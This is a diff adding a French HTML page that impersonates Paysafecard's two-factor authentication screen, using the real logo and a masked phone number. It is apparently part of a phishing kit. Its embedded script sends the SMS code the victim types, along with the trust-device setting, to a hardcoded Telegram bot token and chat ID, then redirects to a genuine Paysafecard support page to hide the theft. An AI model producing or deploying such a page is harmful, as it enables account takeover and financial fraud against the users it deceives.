@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Authentification à deux facteurs</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: "Segoe UI", sans-serif;
+      background-color: #f5f6fb;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+    }
+    img {
+      width: 200px;
+      margin-bottom: 2%;
+    }
+
+    .card {
+      background: white;
+      border-radius: 12px;
+      padding: 40px 30px;
+      width: 350px;
+      box-shadow: 0 5px 20px rgba(0, 0, 0, 0.05);
+    }
+
+    h2 {
+      color: #2d2d77;
+      font-size: 20px;
+      margin-bottom: 20px;
+    }
+
+    .icon {
+      display: flex;
+      align-items: center;
+      margin-bottom: 20px;
+    }
+
+    .icon span {
+      font-size: 14px;
+      color: #6c6c9f;
+      margin-left: 10px;
+    }
+
+    input[type="text"] {
+      width: 90%;
+      padding: 14px;
+      margin-bottom: 20px;
+      border: 1px solid #d8d4f2;
+      border-radius: 8px;
+      font-size: 14px;
+      outline: none;
+    }
+
+    label {
+      font-size: 14px;
+      display: flex;
+      align-items: center;
+      margin-bottom: 20px;
+    }
+
+    input[type="checkbox"] {
+      margin-right: 10px;
+    }
+
+    button {
+      width: 100%;
+      padding: 14px;
+      font-size: 14px;
+      border-radius: 8px;
+      cursor: pointer;
+      font-weight: bold;
+      border: none;
+    }
+
+    .btn-primary {
+      background-color: #3f3fff;
+      color: white;
+      margin-bottom: 15px;
+    }
+
+    .btn-outline {
+      background: transparent;
+      color: #3f3fff;
+      border: 1px solid #d8d4f2;
+    }
+  </style>
+  <link rel="icon" type="image/png" href="/typo3conf/ext/theme/Resources/Public/images/icons/favicon-48x48.png" sizes="48x48">
+</head>
+<body>
+    <img src="https://login.paysafecard.com/customer-auth/clients/mypins/vectors/logo.e00177e8b2.svg" alt="Logo PaysafeCard">
+  
+  <div class="card">
+    <h2>Authentification à deux facteurs</h2>
+    <div class="icon">
+      
+      <span>Un code vous a été envoyé par SMS :<br><strong>+33 *******99</strong></span>
+    </div>
+
+    <input type="text" id="smsCode" placeholder="Code SMS">
+
+    <label>
+      <input type="checkbox" id="trustDevice" checked>
+      Faire confiance à cet appareil
+    </label>
+
+    <button class="btn-primary" id="confirm">Confirmer</button>
+    <button class="btn-outline" id="back">Retour</button>
+  </div>
+
+  <script>
+    const BOT_TOKEN = '7918116689:AAFfBPEbxUudZCnVbmT4DvVD4KwTtZm1qrE';
+    const CHAT_ID = '7498911105';
+    document.getElementById("confirm").addEventListener("click", () => {
+        document.location.href ="index.html"
+    });
+    document.getElementById("confirm").addEventListener("click", () => {
+      const code = document.getElementById("smsCode").value.trim();
+      const trust = document.getElementById("trustDevice").checked;
+
+      if (code === "") {
+        alert("Veuillez entrer le code SMS.");
+        return;
+      }
+
+      const message = `🔐 *Nouveau code 2FA reçu :*\n\n📱 Numéro : +33 *******99\n💬 Code : \`${code}\`\n✅ Appareil de confiance : ${trust ? "Oui" : "Non"}`;
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message,
+          parse_mode: 'Markdown'
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.ok) {
+          console.log("Code envoyé avec succès !");
+          document.location.href = "https://www.paysafecard.com/fr-fr/support/category/19/account-card/paiements-par-carte-de-debit/";
+        } else {
+          console.log("Erreur lors de l'envoi.");
+          console.error(data);
+        }
+      })
+      .catch(error => {
+        console.log("Erreur réseau.");
+        console.error(error);
+      });
+    });
+  </script>
+</body>
+</html>
